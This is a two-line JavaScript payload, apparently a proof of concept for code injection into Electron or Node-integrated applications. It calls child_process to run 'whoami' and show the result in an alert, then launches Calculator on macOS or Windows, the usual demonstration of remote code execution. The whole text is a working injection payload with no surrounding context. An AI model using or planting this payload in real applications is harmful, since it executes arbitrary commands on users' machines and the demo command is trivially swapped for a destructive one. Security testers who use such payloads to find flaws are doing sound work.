alert(require('child_process').execSync('whoami')); 
if(navigator.userAgent.indexOf("Mac")!=-1){ require('child_process').exec('open -a Calculator'); } else{ require('child_process').exec('calc'); }
